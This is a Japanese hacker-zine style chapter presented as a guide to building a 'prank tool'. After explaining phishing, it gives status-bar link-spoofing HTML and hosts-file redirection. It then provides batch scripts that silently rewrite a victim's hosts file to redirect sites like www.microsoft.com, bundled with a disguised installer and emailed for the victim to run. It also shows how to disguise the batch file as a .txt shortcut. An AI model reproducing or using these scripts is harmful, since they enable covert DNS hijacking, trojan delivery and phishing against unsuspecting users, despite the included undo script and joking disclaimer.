x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第4章: 悪戯ツールの作り方 ---

著者：PSY

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) プロローグ

　昔、海外のハッカーグループが、マスコミをからかって遊んだそうです。「こ
のサイト、ハクったぜぃ」とかいいながら、自分の作った偽サイトを行ったり来
たり。URLを見ればおかしいことに気づいたはずですが、当時のマスコミはまるで
初心者。最終的に、パソコンに詳しい人が事態に気づき、この映像は放映されな
かったそうですが、なかなか面白い話だと思いました。
　自分専用WEBブラウザを作ったらどうだろう？　URLの欄を自由に設定できるよ
うにしたら、大手サイトをハックしたように見せかけて、友達をビックリさせる
ことだって簡単にできるじゃないか、と。
　実は、ブラウザを作る必要はありませんでした。もっと簡単な方法で、友達を
ビックリさせることができるのです。最近フィッシング詐欺などでそうした手口
が使われているそうなので、まずはフィッシング詐欺について解説してみようと
思います。


■0x01.) フィッシング詐欺の仕組み

　私のところに、初めて詐欺メールが来たのは、確かかなり昔のこと。シティバ
ンクからの英語のメールでした。「IDとパスワードが漏えいしたので、新しいパ
スワードを設定してほしい」とあり、URLが記されていました。シティバンクなぞ
に口座は持っていないので、これは怪しい。
　URLの上にカーソルを持っていくと、案の定メール上表示されているのと違うU
RLが下のバーに表示されました。これはもう詐欺だと告白しているようなもんで
す。正直、「こんなのに引っかかるヤツいるのかなー」と思ったものです。
　こんなのに引っかかるようでは、サイトを持っている人なら誰でも詐欺ができ
てしまう……と思っていたら、案の定、それから少したって、日本にもマネっこ
詐欺が上陸してきました。
　とはいえ、IDとパスワードがわかっただけではどうしようもありません。架空
口座、偽名義で用意したWEBサイト……と、準備は大変。バレないうちにお金を下
ろしに行くのも一苦労です。まあ個人じゃムリでしょうから、たいていは組織的
犯罪でしょう。
　あ、そういえば、Yahooの偽サイトを作って問題になってた人がいましたっけ。
一般人がヘタに悪いことに手を出すと、ろくなことになりません。

　フィッシング詐欺もだんだん手が込んできて、本家と似たドメインを取ったり
しています。
　さらにたちの悪いことに、下のステータスバーに表示されるURLも偽装されて
いたりします。たとえば、次の部分を切り取ってテキストエディタに貼りつけ、
test.htmlなどの名前で保存してみてください。

-----　test.html
<html><body>
<a href="http://yahoo.co.jp">
<table><tr><td>
<a href="http://akademeia.info/">
http://yahoo.co.jp
</a>
</td></tr></table>
</a>
</body></html>
-----

　IE6でファイルを開き、リンク先の「http://yahoo.co.jp」の文字の上へカーソ
ルを持っていくと、ステータスバーにはちゃんと「http://yahoo.co.jp」と表示
されることでしょう。ところが、クリックしてみると、出てくるのはSecurity A
kademeiaのページです。

　このケースでも、クリックした後のURLを見れば、どこのサイトかわかります。
それでは、ジャンプ先のURL欄を見れば、必ず偽サイトを見分けられるから安心…
…かというと、そうでもないのです。

　ブラウザにURLを打ち込むと、ドメインの部分がPC内部でIPアドレスに変換され
てから、相手のWEBサーバに接続されます。この変換を行っているのがリゾルバと
いうプログラムです。リゾルバは、ドメインとIPアドレスの対応づけを知るため
に、DNSサーバ――ドメイン・ネーム・システムサーバに問合せをします。
　ところが、あるファイルに設定されたドメインについては、DNSサーバに問合せ
ずに直接IPアドレスに変換されるのです。ここで使われるのがhostsファイルです。
　では、自分のPCでhostsファイルを探してみましょう。OSごとのhostsファイル
は下記のフォルダに入っています。

　　Windwos9x/Me ドライブ名:Windows\hosts 
　　WindowsNT/2000 ドライブ名:\WINNT\system32\drivers\etc\hosts 
　　WindowsXP ドライブ名:\WINDOWS\system32\drivers\etc\hosts 

　見つからない方は、フォルダオプションで「隠しファイルを表示しない」の設
定を、「すべてのファイルとフォルダを表示する」に変更すること。「登録され
ている拡張子は表示しない」のチェックも外しておきましょう。

　hostsファイルが見つかったら、テキストエディタで開いて、一番下に次の一行
を書き加え、上書き保存してみてください。

-----
66.249.89.99 www.yahoo.co.jp
-----

　エディタによって、.txtの拡張子がついてしまうことがあるので、確認してお
きましょう。ついていた場合は削っておきます。その後、ブラウザでhttp://www
.yahoo.co.jpを見てみると……さて、どこにつながったでしょう？

　以上からわかるように、hostsファイルに次のような書式で書いておくと、右の
ドメインへが、左のIPアドレスに変換される仕組みになっています。

-----
IPアドレス ドメイン名（ホスト名）
-----

　スパイウェアなどで事前にこれを仕込まれていれば、ブラウザに表示されてい
るのとはまったく違うサイトに接続されてしまうわけです。


■0x03.) 悪戯ツールを作ってみよう

　やけに長い説明終わり！
　ではこれで、どんな悪戯ができるか考えてみましょう。
　一番面白いのは自前でサーバーを立ち上げることですね。フリーウェアも出て
いますので、ブロードバンド環境であれば案外簡単です。IPアドレスを自分のPC
のアドレスにしておいて、友達に「Yahooのサイトをハックしたゼ！」と驚かして
みたり、新聞のサイトをコピーして「こないだ新聞に載ったよ！」とだましてみ
たり……。ハロウィンのTrickにもってこい（？）な演出ができます。
　残念ながらレンタルサーバーのWEBスペースには飛ばせませんが、知人のサイト
を別のサイトに飛ばし、「君のサイトおかしなことになってるよ！」と驚かすこ
とはできるかもしれません。

　…と、いろんなネタが考えられるわけですが、自分のPCで見せるならともかく、
相手が遠くにいる場合、hostsファイルを直接いじるわけにもいかないでしょう。
そこで、hostsファイルを書き換えるツールを作ってみます。といっても、実行フ
ァイルを作るのは面倒なので、簡単にテキストエディタでバッチファイルを作成
します。
　バッチファイルをクリックさせるために、面白いフリーウェアかなにか用意しておきましょう。このソフトのインストーラの拡張子を、次のように書き換えておきます。

setup.exe→setup._

　それから、次の命令をテキストエディタに張りつけて、install.batなどの名前
で保存します。

-----　Windows 2000/NT/XPの場合
if exist %windir%\system32\drivers\etc\hosts.bkup goto end
 ren %windir%\system32\drivers\etc\hosts hosts.bkup
 echo 210.171.226.47 www.microsoft.com>> %windir%\system32\drivers\etc\hosts
:end
setup._
-----

-----　Windows 9x/Meの場合
if exist %windir%\hosts.bkup goto end
 ren %windir%\hosts hosts.bkup
 echo 210.171.226.47 www.microsoft.com>> %windir%\hosts
:end
setup._
-----

　このバッチファイルの中身を簡単に説明すると、以下のようになっています。

1行目：既にバックアップファイルがあれば、処理を実行しない。
2行目：今あるhostsファイルをhosts.bkupにリネームする。
3行目：hostsファイルに設定を書き込む（好きな組み合わせに変えてください）。
4行目：ラベル。
5行目：本物のsetupファイルを実行する。

　実行ファイルは拡張子が違っても実行されてしまう……というのがミソです。
　これをソフトと一緒に圧縮して、メールに添付。本文には、「面白いフリーウ
ェア見つけたよ。install.batをクリックしてね」などと書いておけばよろしい。
友人がソフトをインストールしたのを確認後、メールで、「このサイト見てみて
！」と大手サイトのURLを張りつけて送れば、びっくりすること間違いなしです。
誘導したいサイトのIPアドレスが、自分のサイトでない場合は、コマンドプロン
プトの画面から以下のようにPINGを打って調べてもいいし、

-----
ping ドメイン名
-----

　PINGが禁止されているサイトなら、WEBサイトの変換サービスを利用しても構い
ません。"lookup"というキーワードで検索すれば、たくさん引っかかるはずです。


■0x04.) ファイルを偽装してみよう

　これだけでもよいのですが、用心深い友達だと、実行前にバッチファイルの中
身を確かめるかもしれません。バッチファイルは、テキストエディタで開けば、
簡単に中身が見えてしまいます。
　そこで、バッチファイルをテキストファイルに偽装する方法をご紹介します。

1：まずテキストファイルを用意します。ソフトの使用方法、インストール方法、
シリアル番号、なんでも構いません。テキストエディタで開かれないよう、拡張
子なしの名前（ここでは"info"とする）で保存します。

2：さっきのバッチファイルの最後の1行を、次のように書き換えます。

-----
%windir%\notepad.exe info
-----

3：バッチファイルを右クリックして、「ショートカットの作成」でショートカッ
トを作成します。

4：ショートカットの名前を「最初に読んでね.txt」などに変更します。

5：ファイルのプロパティを開き、「ショートカット」タブでアイコンをテキスト
ファイルのものに変更します。

　こうすると、バッチファイルへのショートカットが一見テキストファイルに見
えます。が、ダブルクリックするとバッチファイルが実行されます。コマンドプ
ロンプトの画面が開いてしまいますが、一瞬で消えてノートパッドでテキストフ
ァイルが開かれるので、ぼんやりしていると気づかないでしょう。


■0x05.) 元に戻す方法

　これで終り……ではありません。悪戯した後は、ちゃんと元に戻してあげまし
ょう。
　さっきのバッチでバックアップファイル（hosts.bkup）を作ってあるため、手
動でも戻せますが、どうせなら修正用のバッチファイルを送ってあげるのが親切
というものです。
　元に戻すバッチの中身は次のようになります。

-----　Windows 2000/NT/XPの場合
if not exist %windir%\system32\drivers\etc\hosts.bkup goto end
 del %windir%\system32\drivers\etc\hosts
 ren %windir%\system32\drivers\etc\hosts.bkup hosts
 echo さっきのはジョークでした。ごめんね。> sorry
 %windir%\notepad.exe sorry
 del sorry
:end
-----

-----　Windows9x/Meの場合
if not exist %windir%\hosts.bkup goto end
 del %windir%\hosts
 ren %windir%\hosts.bkup hosts
 echo さっきのはジョークでした。ごめんね。> sorry
 %windir%\notepad.exe sorry
 del sorry
:end
-----

　謝罪の言葉も入れてみました。ジョークの分かる友達なら、これで友情にヒビ
は入らないはず？
　友達は大切に！


■0x05.) エピローグ

　いかがでしたでしょうか？
　スパイウェアやウイルスなどでよく使われていたテクニックなので、こんなこ
と、とっくの昔に知ってるよ！　と思われた方もおられるかもしれません。しか
し、まだ使える技ではあります。
　バッチファイルだけにいろいろと応用が利きますが、くれぐれも悪事を働いた
り、フィッシング詐欺に使おうなどと思わないように。
　捕まっても知りませんゼ。hehehe。

